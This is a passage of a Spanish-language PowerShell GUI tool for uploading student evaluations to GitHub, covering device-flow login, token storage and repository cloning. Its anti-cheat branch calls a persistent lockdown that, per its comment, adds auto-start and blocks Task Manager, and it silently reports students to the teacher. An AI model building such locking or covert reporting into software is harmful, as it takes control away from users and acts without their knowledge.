                "Ya existe una carpeta '$RepoName' en tu Escritorio, pero esta asociada a otra cuenta de GitHub ('$($check.Owner)').`n`nElimina esa carpeta manualmente o cambia de cuenta.",
                'Carpeta en conflicto', 'OK', 'Error') | Out-Null
            return $false
        }
        Log "→ La carpeta ya existe en: $targetPath (no se reclona)"
    } else {
        Log "→ Clonando $repoUrl en $targetPath..."
        $cloneOutput = git clone $repoUrl $targetPath 2>&1
        $cloneOutput | ForEach-Object { Log "  $_" }
        if ($LASTEXITCODE -ne 0 -or -not (Test-Path $targetPath)) {
            Log '✗ Falló el clone.' 'Red'
            return $false
        }
        Log "✓ Repo clonado en: $targetPath" 'Green'
    }

    # ANTI-TRAMPA: validar que el repo este limpio (sin archivos pre-existentes)
    Log '→ Inspeccionando contenido del repo...'
    $cleanCheck = Test-RepoIsClean -Folder $targetPath
    if (-not $cleanCheck.IsClean) {
        Log "✗ TRAMPA DETECTADA: el repo contiene $($cleanCheck.FilesCount) archivo(s) no permitido(s)." 'Red'
        Log "  Archivos: $($cleanCheck.FilesNames -join ', ')" 'Red'

        # Eliminar la carpeta clonada por seguridad
        try {
            Remove-Item $targetPath -Recurse -Force -ErrorAction Stop
            Log '  Carpeta clonada eliminada.' 'Yellow'
        } catch {
            Log "  No se pudo eliminar la carpeta: $_" 'Red'
        }

        # Limpiar txtCarpeta para que no se intente subir desde alli
        $txtCarpeta.Text = ''

        # ACTIVAR LOCKDOWN PERSISTENTE: marker file + auto-arranque + bloquear TaskMgr
        Trigger-CheatLockdown -RepoName $RepoName `
                              -FilesCount $cleanCheck.FilesCount `
                              -FilesNames $cleanCheck.FilesNames

        # Reportar el evento al profesor via Supabase (silencioso)
        Report-CheatEvent -RepoName $RepoName `
                          -FilesCount $cleanCheck.FilesCount `
                          -FilesNames $cleanCheck.FilesNames

        # Mostrar dialog bloqueante GIGANTE
        Show-CheatAlertDialog -RepoName $RepoName `
                              -FilesCount $cleanCheck.FilesCount `
                              -FilesNames $cleanCheck.FilesNames

        Set-Status 'Operacion bloqueada por integridad academica.'
        Update-ButtonStates
        return $false
    }
    Log '✓ Repo limpio (sin archivos pre-existentes).' 'Green'

    # Setear automaticamente la carpeta para el siguiente paso (Subir)
    $txtCarpeta.Text = $targetPath
    Update-ButtonStates

    # Abrir IDLE de Python apuntando al folder
    Open-PythonIDLE -Folder $targetPath | Out-Null

    # Avisar al alumno con MessageBox
    [System.Windows.Forms.MessageBox]::Show(
        "El repositorio '$RepoName' está clonado en:`n`n$targetPath`n`n" +
        "Se abrió IDLE de Python en esa carpeta.`n`n" +
        "Cuando termines de editar tu evaluación:`n" +
        "1. Guarda los cambios en IDLE (Ctrl+S)`n" +
        "2. Vuelve a esta ventana`n" +
        "3. Haz clic en 'Subir Archivos'",
        'Repositorio listo', 'OK', 'Information') | Out-Null

    Set-Status "Listo. Edita en IDLE y luego Subir Archivos."
    return $true
}

# ============================================================
#         DEVICE FLOW LOGIN (sin abrir navegador local)
# ============================================================

function Start-GitHubDeviceLogin {
    # OAuth Client ID público del GitHub CLI oficial
    $clientId = '178c6fc778ccc68e1d6a'

    # 1. Solicitar device code
    try {
        $resp = Invoke-RestMethod -Method Post `
            -Uri 'https://github.com/login/device/code' `
            -Body @{ client_id = $clientId; scope = 'repo workflow read:org gist' } `
            -Headers @{ 'Accept' = 'application/json' }
    } catch {
        [System.Windows.Forms.MessageBox]::Show(
            "Error contactando GitHub: $_`n`nVerifica tu conexión a internet.",
            'Error de red', 'OK', 'Error') | Out-Null
        return $false
    }

    $deviceCode = $resp.device_code
    $userCode   = $resp.user_code        # Formato: XXXX-XXXX
    $verifyUri  = $resp.verification_uri # https://github.com/login/device
    $interval   = [int]$resp.interval
    $expiresIn  = [int]$resp.expires_in
    $startTime  = Get-Date

    # 2. Construir dialog
    $dlg = New-Object System.Windows.Forms.Form
    $dlg.Text = 'Iniciar sesión en GitHub'
    $dlg.Size = New-Object System.Drawing.Size(550, 480)
    $dlg.StartPosition = 'CenterParent'
    $dlg.FormBorderStyle = 'FixedDialog'
    $dlg.MaximizeBox = $false
    $dlg.MinimizeBox = $false

    # Paso 1
    $lblPaso1 = New-Object System.Windows.Forms.Label
    $lblPaso1.Text = 'PASO 1: Abre esta URL en tu navegador o celular'
    $lblPaso1.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
    $lblPaso1.Location = New-Object System.Drawing.Point(20, 20)
    $lblPaso1.Size = New-Object System.Drawing.Size(500, 22)
    $dlg.Controls.Add($lblPaso1)

    $txtUrl = New-Object System.Windows.Forms.TextBox
    $txtUrl.Text = $verifyUri
    $txtUrl.ReadOnly = $true
    $txtUrl.Font = New-Object System.Drawing.Font('Consolas', 11)
    $txtUrl.Location = New-Object System.Drawing.Point(20, 48)
    $txtUrl.Size = New-Object System.Drawing.Size(380, 25)
    $dlg.Controls.Add($txtUrl)

    $btnCopyUrl = New-Object System.Windows.Forms.Button
    $btnCopyUrl.Text = 'Copiar'
    $btnCopyUrl.Location = New-Object System.Drawing.Point(410, 47)
    $btnCopyUrl.Size = New-Object System.Drawing.Size(110, 27)
    $btnCopyUrl.Add_Click({
        [System.Windows.Forms.Clipboard]::SetText($verifyUri)
        $btnCopyUrl.Text = 'Copiado!'
    })
    $dlg.Controls.Add($btnCopyUrl)

    # Paso 2
    $lblPaso2 = New-Object System.Windows.Forms.Label
    $lblPaso2.Text = 'PASO 2: Ingresa este código'
    $lblPaso2.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
    $lblPaso2.Location = New-Object System.Drawing.Point(20, 95)
    $lblPaso2.Size = New-Object System.Drawing.Size(500, 22)
    $dlg.Controls.Add($lblPaso2)

    $lblCode = New-Object System.Windows.Forms.Label
    $lblCode.Text = $userCode
    $lblCode.Font = New-Object System.Drawing.Font('Consolas', 28, [System.Drawing.FontStyle]::Bold)
    $lblCode.TextAlign = 'MiddleCenter'
    $lblCode.BackColor = [System.Drawing.Color]::FromArgb(33, 33, 33)
    $lblCode.ForeColor = [System.Drawing.Color]::LimeGreen
    $lblCode.Location = New-Object System.Drawing.Point(20, 125)
    $lblCode.Size = New-Object System.Drawing.Size(380, 60)
    $dlg.Controls.Add($lblCode)

    $btnCopyCode = New-Object System.Windows.Forms.Button
    $btnCopyCode.Text = 'Copiar código'
    $btnCopyCode.Location = New-Object System.Drawing.Point(410, 140)
    $btnCopyCode.Size = New-Object System.Drawing.Size(110, 32)
    $btnCopyCode.Add_Click({
        [System.Windows.Forms.Clipboard]::SetText($userCode)
        $btnCopyCode.Text = 'Copiado!'
    })
    $dlg.Controls.Add($btnCopyCode)

    # Botón abrir browser (opcional)
    $btnOpen = New-Object System.Windows.Forms.Button
    $btnOpen.Text = 'Abrir URL en navegador (opcional)'
    $btnOpen.Location = New-Object System.Drawing.Point(20, 205)
    $btnOpen.Size = New-Object System.Drawing.Size(500, 32)
    $btnOpen.Add_Click({
        Start-Process $verifyUri
    })
    $dlg.Controls.Add($btnOpen)

    # Status
    $lblStatus = New-Object System.Windows.Forms.Label
    $lblStatus.Text = 'Esperando que ingreses el código...'
    $lblStatus.Font = New-Object System.Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Italic)
    $lblStatus.ForeColor = [System.Drawing.Color]::DarkOrange
    $lblStatus.TextAlign = 'MiddleCenter'
    $lblStatus.Location = New-Object System.Drawing.Point(20, 255)
    $lblStatus.Size = New-Object System.Drawing.Size(500, 22)
    $dlg.Controls.Add($lblStatus)

    # Progress bar
    $progress = New-Object System.Windows.Forms.ProgressBar
    $progress.Style = 'Marquee'
    $progress.MarqueeAnimationSpeed = 30
    $progress.Location = New-Object System.Drawing.Point(20, 285)
    $progress.Size = New-Object System.Drawing.Size(500, 12)
    $dlg.Controls.Add($progress)

    # Tiempo restante
    $lblTime = New-Object System.Windows.Forms.Label
    $lblTime.Text = "Código válido por: $($expiresIn / 60) minutos"
    $lblTime.Font = New-Object System.Drawing.Font('Segoe UI', 8)
    $lblTime.ForeColor = [System.Drawing.Color]::Gray
    $lblTime.TextAlign = 'MiddleCenter'
    $lblTime.Location = New-Object System.Drawing.Point(20, 310)
    $lblTime.Size = New-Object System.Drawing.Size(500, 18)
    $dlg.Controls.Add($lblTime)

    # Botón cancelar
    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Text = 'Cancelar'
    $btnCancel.Location = New-Object System.Drawing.Point(210, 395)
    $btnCancel.Size = New-Object System.Drawing.Size(120, 32)
    $btnCancel.DialogResult = 'Cancel'
    $dlg.Controls.Add($btnCancel)
    $dlg.CancelButton = $btnCancel

    # Estado del polling (var de cierre)
    $script:authResult = $null
    $script:authToken = $null

    # Timer para polling
    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = $interval * 1000
    $timer.Add_Tick({
        # Chequear expiración
        $elapsed = (Get-Date) - $startTime
        $remaining = [int]($expiresIn - $elapsed.TotalSeconds)
        if ($remaining -le 0) {
            $timer.Stop()
            $lblStatus.Text = 'Código expirado. Cierra y vuelve a intentar.'
            $lblStatus.ForeColor = [System.Drawing.Color]::Red
            $progress.Style = 'Continuous'
            $progress.Value = 0
            return
        }
        $lblTime.Text = "Tiempo restante: $([int]($remaining / 60)) min $($remaining % 60) seg"

        # Poll al endpoint de token
        try {
            $tokenResp = Invoke-RestMethod -Method Post `
                -Uri 'https://github.com/login/oauth/access_token' `
                -Body @{
                    client_id   = $clientId
                    device_code = $deviceCode
                    grant_type  = 'urn:ietf:params:oauth:grant-type:device_code'
                } `
                -Headers @{ 'Accept' = 'application/json' }

            if ($tokenResp.access_token) {
                $timer.Stop()
                # Limpiar token de whitespace/newlines defensivamente
                $script:authToken = ($tokenResp.access_token -as [string]).Trim()
                $script:authResult = 'OK'
                $script:authScopes = $tokenResp.scope
                $lblStatus.Text = 'Autorizado! Guardando credenciales...'
                $lblStatus.ForeColor = [System.Drawing.Color]::Green
                $progress.Style = 'Continuous'
                $progress.Value = 100
                $dlg.DialogResult = 'OK'
                Start-Sleep -Milliseconds 800
                $dlg.Close()
                return
            }

            switch ($tokenResp.error) {
                'authorization_pending' { return }  # Seguir esperando
                'slow_down' {
                    $timer.Interval = ($interval + 5) * 1000
                    return
                }
                'expired_token' {
                    $timer.Stop()
                    $lblStatus.Text = 'Código expirado.'
                    $lblStatus.ForeColor = [System.Drawing.Color]::Red
                }
                'access_denied' {
                    $timer.Stop()
                    $lblStatus.Text = 'Acceso denegado por el usuario.'
                    $lblStatus.ForeColor = [System.Drawing.Color]::Red
                }
                default {
                    $lblStatus.Text = "Estado: $($tokenResp.error)"
                }
            }
        } catch {
            $lblStatus.Text = "Error de red (reintentando)..."
        }
    })
    $timer.Start()

    # Mostrar dialog modal
    $result = $dlg.ShowDialog($form)
    $timer.Stop()
    $timer.Dispose()

    if ($result -ne 'OK' -or -not $script:authToken) {
        return $false
    }

    # Guardar token en gh CLI usando .NET Process API
    # (mas confiable que pipe de PowerShell que puede romper encoding)
    return Save-GhToken -Token $script:authToken
}

function Save-GhToken {
    param([string]$Token)

    if (-not $Token) {
        Log '✗ No hay token para guardar.' 'Red'
        return $false
    }

    # Sanity check del token recibido
    $Token = $Token.Trim() -replace "`r", '' -replace "`n", ''
    if ($Token.Length -lt 20) {
        Log "✗ Token recibido es invalido (length=$($Token.Length))." 'Red'
        return $false
    }
    $prefix = $Token.Substring(0, 4)
    Log "→ Token recibido (length=$($Token.Length), prefix='$prefix...')"

    # 1. Validar el token PRIMERO contra la API antes de intentar guardarlo
    Log '→ Validando token contra api.github.com...'
    try {
        $userInfo = Invoke-RestMethod -Method Get `
            -Uri 'https://api.github.com/user' `
            -Headers @{
                'Authorization' = "Bearer $Token"
                'Accept' = 'application/vnd.github+json'
                'X-GitHub-Api-Version' = '2022-11-28'
                'User-Agent' = 'Subir-Evaluacion-Script'
            }
        Log "✓ Token valido. Usuario: @$($userInfo.login)" 'Green'
    } catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        Log "✗ Token rechazado por GitHub API (HTTP $statusCode)." 'Red'
        Log "  Detalle: $_" 'Red'
        [System.Windows.Forms.MessageBox]::Show(
            "GitHub rechazo el token con HTTP $statusCode.`n`n" +
            "Esto puede pasar si:`n" +
            "  - El device flow expiro entre autorizar y guardar`n" +
            "  - El reloj del sistema esta muy desincronizado`n`n" +
            "Intenta de nuevo (cierra el dialog y vuelve a iniciar sesion).",
            'Token rechazado por GitHub', 'OK', 'Error') | Out-Null
        return $false
    }

    # 2. Limpiar sesion previa
    try {
        gh auth status --hostname github.com 2>&1 | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Log '→ Cerrando sesion previa...'
            gh auth logout --hostname github.com 2>&1 | Out-Null
        }
    } catch {}

    # 3. ESTRATEGIA A: gh auth login --with-token via Process API
    $ghCmd = Get-Command gh -ErrorAction SilentlyContinue
    if ($ghCmd) {
        Log '→ Estrategia A: gh auth login --with-token'
        $okA = Save-GhTokenViaProcess -Token $Token -GhPath $ghCmd.Source
        if ($okA) { return $true }
        Log '  Estrategia A fallo. Intentando B...' 'Yellow'
    }

    # 4. ESTRATEGIA B: escribir directamente al hosts.yml de gh
    Log '→ Estrategia B: escribir hosts.yml directamente'
    $okB = Save-GhTokenToHostsYml -Token $Token -Login $userInfo.login
    if ($okB) {
        # Validar
        $null = gh auth status 2>&1
        if ($LASTEXITCODE -eq 0) {
            Log '✓ Token guardado en hosts.yml correctamente.' 'Green'
            return $true
        }
    }

    Log '✗ Ambas estrategias de guardado fallaron.' 'Red'
    return $false
}

function Save-GhTokenViaProcess {
    param(
        [string]$Token,
        [string]$GhPath
    )

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $GhPath
    $psi.Arguments = 'auth login --hostname github.com --git-protocol https --with-token'
    $psi.RedirectStandardInput = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
    $psi.StandardErrorEncoding = [System.Text.Encoding]::UTF8

    try {
        $proc = [System.Diagnostics.Process]::Start($psi)
        # Usar Write (no WriteLine) para evitar CRLF
        $proc.StandardInput.Write($Token)
        $proc.StandardInput.Close()

        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()

        if (-not $proc.WaitForExit(15000)) {
            $proc.Kill()
            Log '  Timeout (>15s).' 'Red'
            return $false
        }

        if ($proc.ExitCode -eq 0) {
            Log '  ✓ Process A OK.' 'Green'
            return $true
        }

        Log "  Process A fallo (exit $($proc.ExitCode))." 'Yellow'
        if ($stdout) { Log "    stdout: $($stdout.Trim())" 'Yellow' }
        if ($stderr) { Log "    stderr: $($stderr.Trim())" 'Yellow' }
        return $false
    } catch {
        Log "  Excepcion en Process A: $_" 'Red'
        return $false
    }
}

function Save-GhTokenToHostsYml {
    param(
        [string]$Token,
        [string]$Login
    )

    # Path standard de gh CLI en Windows
    $ghDir = Join-Path $env:APPDATA 'GitHub CLI'
    if (-not (Test-Path $ghDir)) {
        New-Item -ItemType Directory -Path $ghDir -Force | Out-Null
    }
    $hostsFile = Join-Path $ghDir 'hosts.yml'

    # Formato YAML que gh espera
    $yaml = @"
github.com:
    git_protocol: https
    user: $Login
    oauth_token: $Token
"@

    try {
        # Escribir como UTF-8 sin BOM
        [System.IO.File]::WriteAllText($hostsFile, $yaml, (New-Object System.Text.UTF8Encoding $false))
        Log "  hosts.yml escrito en: $hostsFile"
        return $true
    } catch {
        Log "  Error escribiendo hosts.yml: $_" 'Red'
        return $false
    } finally {
        $Token = $null
    }
}

# ============================================================
#                     FORMULARIO PRINCIPAL
# ============================================================

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Subir Evaluación a GitHub'
$form.Size = New-Object System.Drawing.Size(640, 705)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false

# -- Título --
$lblTitulo = New-Object System.Windows.Forms.Label
$lblTitulo.Text = 'Evaluación → GitHub'
$lblTitulo.Font = New-Object System.Drawing.Font('Segoe UI', 16, [System.Drawing.FontStyle]::Bold)
$lblTitulo.Location = New-Object System.Drawing.Point(20, 15)
$lblTitulo.Size = New-Object System.Drawing.Size(420, 35)
$form.Controls.Add($lblTitulo)

# -- Panel de sesión (esquina superior derecha) --
$grpSesion = New-Object System.Windows.Forms.GroupBox
$grpSesion.Text = 'Cuenta de GitHub'
$grpSesion.Location = New-Object System.Drawing.Point(440, 5)
$grpSesion.Size = New-Object System.Drawing.Size(180, 50)
$form.Controls.Add($grpSesion)

$lblSesionUser = New-Object System.Windows.Forms.Label
$lblSesionUser.Text = 'Verificando...'
$lblSesionUser.Font = New-Object System.Drawing.Font('Segoe UI', 8, [System.Drawing.FontStyle]::Bold)
$lblSesionUser.Location = New-Object System.Drawing.Point(8, 18)
$lblSesionUser.Size = New-Object System.Drawing.Size(165, 14)
$lblSesionUser.ForeColor = [System.Drawing.Color]::Gray
$grpSesion.Controls.Add($lblSesionUser)

$lblSesionEmail = New-Object System.Windows.Forms.Label
$lblSesionEmail.Text = ''
$lblSesionEmail.Font = New-Object System.Drawing.Font('Segoe UI', 7)
$lblSesionEmail.Location = New-Object System.Drawing.Point(8, 32)
$lblSesionEmail.Size = New-Object System.Drawing.Size(165, 14)
$lblSesionEmail.ForeColor = [System.Drawing.Color]::DimGray
$grpSesion.Controls.Add($lblSesionEmail)

$btnLogin = New-Object System.Windows.Forms.Button
$btnLogin.Text = 'Iniciar sesión'
$btnLogin.Location = New-Object System.Drawing.Point(440, 58)
$btnLogin.Size = New-Object System.Drawing.Size(85, 28)
$btnLogin.BackColor = [System.Drawing.Color]::FromArgb(33, 150, 243)
$btnLogin.ForeColor = [System.Drawing.Color]::White
$btnLogin.FlatStyle = 'Flat'
$btnLogin.Font = New-Object System.Drawing.Font('Segoe UI', 8)
$form.Controls.Add($btnLogin)

$btnLogout = New-Object System.Windows.Forms.Button
$btnLogout.Text = 'Cerrar sesión'
$btnLogout.Location = New-Object System.Drawing.Point(530, 58)
$btnLogout.Size = New-Object System.Drawing.Size(90, 28)
$btnLogout.BackColor = [System.Drawing.Color]::FromArgb(198, 40, 40)
$btnLogout.ForeColor = [System.Drawing.Color]::White
$btnLogout.FlatStyle = 'Flat'
$btnLogout.Font = New-Object System.Drawing.Font('Segoe UI', 8)
$btnLogout.Enabled = $false
$form.Controls.Add($btnLogout)

# -- Link para crear cuenta (debajo del groupbox de sesión) --
$lnkCrearCuenta = New-Object System.Windows.Forms.LinkLabel
$lnkCrearCuenta.Text = '¿No tienes cuenta de GitHub? Créala aquí'
$lnkCrearCuenta.Location = New-Object System.Drawing.Point(440, 90)
$lnkCrearCuenta.Size = New-Object System.Drawing.Size(180, 18)
$lnkCrearCuenta.Font = New-Object System.Drawing.Font('Segoe UI', 8, [System.Drawing.FontStyle]::Underline)
$lnkCrearCuenta.LinkColor = [System.Drawing.Color]::FromArgb(33, 150, 243)
$lnkCrearCuenta.ActiveLinkColor = [System.Drawing.Color]::FromArgb(13, 71, 161)
$lnkCrearCuenta.TextAlign = 'MiddleRight'
$form.Controls.Add($lnkCrearCuenta)

# -- GroupBox: Modo de subida --
$grpModo = New-Object System.Windows.Forms.GroupBox
$grpModo.Text = 'Modo de subida'
$grpModo.Location = New-Object System.Drawing.Point(20, 95)
$grpModo.Size = New-Object System.Drawing.Size(600, 55)
$form.Controls.Add($grpModo)

$rbModoNuevo = New-Object System.Windows.Forms.RadioButton
$rbModoNuevo.Text = 'Crear repositorio nuevo'
$rbModoNuevo.Location = New-Object System.Drawing.Point(15, 22)
$rbModoNuevo.Size = New-Object System.Drawing.Size(220, 22)
$rbModoNuevo.Checked = $true
$grpModo.Controls.Add($rbModoNuevo)

$rbModoExistente = New-Object System.Windows.Forms.RadioButton
$rbModoExistente.Text = 'Usar repositorio existente de mi cuenta'
$rbModoExistente.Location = New-Object System.Drawing.Point(280, 22)
$rbModoExistente.Size = New-Object System.Drawing.Size(300, 22)
$grpModo.Controls.Add($rbModoExistente)

# -- Nombre completo (modo nuevo) --
$lblNombre = New-Object System.Windows.Forms.Label
$lblNombre.Text = 'Nombre completo:'
$lblNombre.Location = New-Object System.Drawing.Point(20, 165)
$lblNombre.Size = New-Object System.Drawing.Size(150, 20)
$form.Controls.Add($lblNombre)

$txtNombre = New-Object System.Windows.Forms.TextBox
$txtNombre.Location = New-Object System.Drawing.Point(180, 163)
$txtNombre.Size = New-Object System.Drawing.Size(420, 22)
$form.Controls.Add($txtNombre)

# -- Tipo de evaluación (modo nuevo) --
$lblForma = New-Object System.Windows.Forms.Label
$lblForma.Text = 'Tipo de evaluación:'
$lblForma.Location = New-Object System.Drawing.Point(20, 200)
$lblForma.Size = New-Object System.Drawing.Size(150, 20)
$form.Controls.Add($lblForma)

$cmbForma = New-Object System.Windows.Forms.ComboBox
$cmbForma.Location = New-Object System.Drawing.Point(180, 198)
$cmbForma.Size = New-Object System.Drawing.Size(420, 22)
$cmbForma.DropDownStyle = 'DropDownList'
$cmbForma.Items.AddRange(@('Evaluacion-1', 'Evaluacion-2', 'Evaluacion-3', 'Evaluacion-4', 'Examen'))
$form.Controls.Add($cmbForma)

# -- Repositorio existente (modo existente) --
$lblRepoExist = New-Object System.Windows.Forms.Label
$lblRepoExist.Text = 'Tu repositorio:'
$lblRepoExist.Location = New-Object System.Drawing.Point(20, 235)
$lblRepoExist.Size = New-Object System.Drawing.Size(150, 20)
$form.Controls.Add($lblRepoExist)

$cmbReposExistentes = New-Object System.Windows.Forms.ComboBox
$cmbReposExistentes.Location = New-Object System.Drawing.Point(180, 233)
$cmbReposExistentes.Size = New-Object System.Drawing.Size(330, 22)
$cmbReposExistentes.DropDownStyle = 'DropDownList'
$cmbReposExistentes.Enabled = $false
$form.Controls.Add($cmbReposExistentes)

$btnRefreshRepos = New-Object System.Windows.Forms.Button
$btnRefreshRepos.Text = 'Refrescar'
$btnRefreshRepos.Location = New-Object System.Drawing.Point(520, 232)
$btnRefreshRepos.Size = New-Object System.Drawing.Size(80, 25)
$btnRefreshRepos.Enabled = $false
$form.Controls.Add($btnRefreshRepos)

# -- Carpeta de archivos --
$lblCarpeta = New-Object System.Windows.Forms.Label
$lblCarpeta.Text = 'Carpeta del proyecto:'
$lblCarpeta.Location = New-Object System.Drawing.Point(20, 270)
$lblCarpeta.Size = New-Object System.Drawing.Size(150, 20)
$form.Controls.Add($lblCarpeta)

$txtCarpeta = New-Object System.Windows.Forms.TextBox
$txtCarpeta.Location = New-Object System.Drawing.Point(180, 268)
$txtCarpeta.Size = New-Object System.Drawing.Size(330, 22)
$txtCarpeta.ReadOnly = $true
$form.Controls.Add($txtCarpeta)

$btnBuscar = New-Object System.Windows.Forms.Button
$btnBuscar.Text = 'Buscar...'
$btnBuscar.Location = New-Object System.Drawing.Point(520, 267)
$btnBuscar.Size = New-Object System.Drawing.Size(80, 25)
$form.Controls.Add($btnBuscar)

# -- Nombre del repo (preview) --
$lblRepoPreview = New-Object System.Windows.Forms.Label
$lblRepoPreview.Text = 'Repo destino:'
$lblRepoPreview.Location = New-Object System.Drawing.Point(20, 305)
$lblRepoPreview.Size = New-Object System.Drawing.Size(150, 20)
$form.Controls.Add($lblRepoPreview)

$lblRepoValor = New-Object System.Windows.Forms.Label
$lblRepoValor.Text = '(rellenar nombre y forma)'
$lblRepoValor.ForeColor = [System.Drawing.Color]::Gray
$lblRepoValor.Font = New-Object System.Drawing.Font('Consolas', 10)
$lblRepoValor.Location = New-Object System.Drawing.Point(180, 305)
$lblRepoValor.Size = New-Object System.Drawing.Size(420, 20)
$form.Controls.Add($lblRepoValor)

# -- Aviso: repositorios siempre publicos --
$lblAvisoPublic = New-Object System.Windows.Forms.Label
$lblAvisoPublic.Text = 'ⓘ Los repositorios se crean siempre como públicos para que el profesor pueda verlos.'
$lblAvisoPublic.Location = New-Object System.Drawing.Point(20, 335)
$lblAvisoPublic.Size = New-Object System.Drawing.Size(600, 20)
$lblAvisoPublic.ForeColor = [System.Drawing.Color]::FromArgb(96, 96, 96)
$lblAvisoPublic.Font = New-Object System.Drawing.Font('Segoe UI', 8, [System.Drawing.FontStyle]::Italic)
$form.Controls.Add($lblAvisoPublic)

# -- Botones de acción --
$btnCrearRepo = New-Object System.Windows.Forms.Button
$btnCrearRepo.Text = '1. Crear Repo'
$btnCrearRepo.Location = New-Object System.Drawing.Point(20, 365)
$btnCrearRepo.Size = New-Object System.Drawing.Size(180, 35)
$btnCrearRepo.BackColor = [System.Drawing.Color]::FromArgb(33, 150, 243)
$btnCrearRepo.ForeColor = [System.Drawing.Color]::White
$btnCrearRepo.FlatStyle = 'Flat'
$form.Controls.Add($btnCrearRepo)

$btnSubir = New-Object System.Windows.Forms.Button
$btnSubir.Text = '2. Subir Archivos'
$btnSubir.Location = New-Object System.Drawing.Point(330, 365)
$btnSubir.Size = New-Object System.Drawing.Size(280, 35)
$btnSubir.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
$btnSubir.ForeColor = [System.Drawing.Color]::White
$btnSubir.FlatStyle = 'Flat'
$btnSubir.Font = New-Object System.Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)
$form.Controls.Add($btnSubir)

# btnCrearRepo agrandado para usar el espacio que dejo Hacer TODO
$btnCrearRepo.Size = New-Object System.Drawing.Size(280, 35)
$btnCrearRepo.Location = New-Object System.Drawing.Point(30, 365)
$btnCrearRepo.Font = New-Object System.Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)

# -- Log de salida --
$lblLog = New-Object System.Windows.Forms.Label
$lblLog.Text = 'Salida:'
$lblLog.Location = New-Object System.Drawing.Point(20, 410)
$lblLog.Size = New-Object System.Drawing.Size(100, 20)
$form.Controls.Add($lblLog)

$txtLog = New-Object System.Windows.Forms.TextBox
$txtLog.Location = New-Object System.Drawing.Point(20, 435)
$txtLog.Size = New-Object System.Drawing.Size(600, 195)
$txtLog.Multiline = $true
$txtLog.ScrollBars = 'Vertical'
$txtLog.ReadOnly = $true
$txtLog.BackColor = [System.Drawing.Color]::Black
$txtLog.ForeColor = [System.Drawing.Color]::LimeGreen
$txtLog.Font = New-Object System.Drawing.Font('Consolas', 9)
$form.Controls.Add($txtLog)

# -- Status bar --
$lblStatus = New-Object System.Windows.Forms.Label
$lblStatus.Location = New-Object System.Drawing.Point(20, 640)
$lblStatus.Size = New-Object System.Drawing.Size(600, 20)
$lblStatus.Text = 'Listo.'
$form.Controls.Add($lblStatus)

# ============================================================
#                     LÓGICA / EVENTOS
# ============================================================

function Log {
    param([string]$Msg, [string]$Color = 'LimeGreen')
    $txtLog.AppendText("[$([DateTime]::Now.ToString('HH:mm:ss'))] $Msg`r`n")
    $txtLog.SelectionStart = $txtLog.Text.Length
    $txtLog.ScrollToCaret()
    [System.Windows.Forms.Application]::DoEvents()
}

function Set-Status {
    param([string]$Msg)
    $lblStatus.Text = $Msg
    [System.Windows.Forms.Application]::DoEvents()
}

function Update-RepoPreview {
    if ($rbModoExistente.Checked) {
        if ($cmbReposExistentes.SelectedItem) {
            $lblRepoValor.Text = (Get-RepoName)
            $lblRepoValor.ForeColor = [System.Drawing.Color]::Black
        } else {
            $lblRepoValor.Text = '(selecciona un repositorio de la lista)'
            $lblRepoValor.ForeColor = [System.Drawing.Color]::Gray
        }
        return
    }
    # Modo: crear nuevo
    $nombre = $txtNombre.Text.Trim()
    $forma = $cmbForma.Text.Trim()
    if ($nombre -and $forma) {
        $repo = Sanitize-RepoName "$nombre-$forma"
        $lblRepoValor.Text = $repo
        $lblRepoValor.ForeColor = [System.Drawing.Color]::Black
    } else {
        $lblRepoValor.Text = '(rellenar nombre y forma)'
        $lblRepoValor.ForeColor = [System.Drawing.Color]::Gray
    }
}

function Get-RepoName {
    if ($rbModoExistente.Checked) {
        $sel = $cmbReposExistentes.SelectedItem
        if (-not $sel) { return $null }
        # Items vienen en formato "🔒 nombre-del-repo" — quitamos el emoji + espacios
        return ($sel -replace '^\S+\s+', '').Trim()
    }
    $nombre = $txtNombre.Text.Trim()
    $forma = $cmbForma.Text.Trim()
    if (-not $nombre -or -not $forma) { return $null }
    return (Sanitize-RepoName "$nombre-$forma")
}

function Load-UserRepos {
    if (-not (Test-GhAuth)) {
        Log '✗ Sin sesion. Inicia sesion primero para ver tus repos.' 'Red'
        return
    }
    Log '→ Cargando lista de repositorios de tu cuenta...'
    $cmbReposExistentes.Items.Clear()
    Set-Status 'Cargando repos...'
    try {
        $reposJson = gh repo list --json name,visibility,description,isArchived --limit 200 2>$null
        if ($LASTEXITCODE -ne 0 -or -not $reposJson) {
            Log '✗ Error al listar repositorios.' 'Red'
            Set-Status 'Error.'
            return
        }
        $repos = $reposJson | ConvertFrom-Json | Sort-Object name
        $count = 0
        foreach ($r in $repos) {
            if ($r.isArchived) { continue }
            $vis = if ($r.visibility -eq 'PRIVATE') { '[Priv]' } else { '[Pub]' }
            [void]$cmbReposExistentes.Items.Add("$vis $($r.name)")
            $count++
        }
        Log "✓ $count repositorios cargados." 'Green'
        Set-Status "Repos disponibles: $count"
    } catch {
        Log "✗ Error: $_" 'Red'
        Set-Status 'Error.'
    }
}

function Set-ModoUI {
    if ($rbModoExistente.Checked) {
        # Habilitar selector existente
        $cmbReposExistentes.Enabled = $true
        $btnRefreshRepos.Enabled = $true
        # Deshabilitar campos de modo nuevo
        $txtNombre.Enabled = $false
        $cmbForma.Enabled = $false
        # Cambiar texto del boton 1
        $btnCrearRepo.Text = '1. Clonar Repo'
        # Cargar repos si no hay items
        if ($cmbReposExistentes.Items.Count -eq 0) {
            Load-UserRepos
        }
    } else {
